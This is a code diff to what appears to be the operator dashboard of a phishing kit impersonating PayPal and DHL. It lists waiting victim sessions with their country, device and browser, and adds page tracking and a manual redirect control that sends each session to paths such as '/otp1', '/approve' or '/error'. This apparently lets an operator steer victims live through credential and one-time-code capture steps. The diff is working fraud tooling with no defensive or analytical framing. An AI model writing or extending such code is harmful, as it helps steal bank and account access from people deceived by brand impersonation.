@@ -254,6 +254,9 @@ interface PaypalSession {
   device?: string;
   browser?: string;
   status: string;
+  redirectVersion?: number;
+  currentPath?: string;
+  redirectUrl?: string;
   createdAt: Date;
 }
 
@@ -267,6 +270,9 @@ interface DhlSession {
   device?: string;
   browser?: string;
   status: string;
+  redirectVersion?: number;
+  currentPath?: string;
+  redirectUrl?: string;
   createdAt: Date;
 }
 
@@ -387,6 +393,7 @@ function WaitingPayPalSessionsPanel() {
 
 function WaitingDHLSessionsPanel() {
   const { toast } = useToast();
+  const [customUrls, setCustomUrls] = useState<Record<string, string>>({});
 
   const { data: sessions } = useQuery<DhlSession[]>({
     queryKey: ["/api/admin/dhl-sessions"],
@@ -417,6 +424,14 @@ function WaitingDHLSessionsPanel() {
 
   const handleRedirect = (sessionId: string, url: string) => {
     redirectMutation.mutate({ sessionId, url });
+  };
+
+  const handleCustomRedirect = (sessionId: string) => {
+    const url = customUrls[sessionId];
+    if (url && url.trim()) {
+      handleRedirect(sessionId, url.trim());
+      setCustomUrls({ ...customUrls, [sessionId]: "" }); // Clear input after redirect
+    }
   };
 
   if (!sessions || sessions.length === 0) {
@@ -460,16 +475,47 @@ function WaitingDHLSessionsPanel() {
                       </p>
                     </div>
                     <div>
+                      <p className="text-muted-foreground">Page actuelle</p>
+                      <p className="font-mono text-xs text-blue-600">
+                        {session.currentPath || '/dhl/waiting'}
+                      </p>
+                    </div>
+                    <div>
+                      <p className="text-muted-foreground">Redirections</p>
+                      <p className="font-medium">
+                        v{session.redirectVersion || 0}
+                      </p>
+                    </div>
+                    <div>
                       <p className="text-muted-foreground">Pays</p>
                       <p className="font-medium">{session.country || 'Unknown'}</p>
                     </div>
-                    <div>
-                      <p className="text-muted-foreground">IP</p>
-                      <p className="font-mono text-xs">{session.ipAddress || 'Unknown'}</p>
-                    </div>
-                    <div>
-                      <p className="text-muted-foreground">Appareil</p>
-                      <p className="font-medium">{session.device || 'Unknown'}</p>
+                  </div>
+
+                  {/* Custom URL Input */}
+                  <div className="pt-2 border-t">
+                    <Label htmlFor={`custom-url-${session.sessionId}`} className="text-sm text-muted-foreground">
+                      URL personnalisée
+                    </Label>
+                    <div className="flex gap-2 mt-2">
+                      <Input
+                        id={`custom-url-${session.sessionId}`}
+                        data-testid={`input-custom-redirect-${session.sessionId}`}
+                        type="text"
+                        placeholder="/approve, /otp1, /error, /success..."
+                        value={customUrls[session.sessionId] || ""}
+                        onChange={(e) => setCustomUrls({ ...customUrls, [session.sessionId]: e.target.value })}
+                        className="flex-1"
+                      />
+                      <Button
+                        onClick={() => handleCustomRedirect(session.sessionId)}
+                        disabled={!customUrls[session.sessionId]?.trim()}
+                        variant="outline"
+                        data-testid={`button-custom-redirect-${session.sessionId}`}
+                      >
+                        <ExternalLink className="mr-2 h-4 w-4" />
+                        Rediriger
+                      </Button>
                     </div>
                   </div>
 
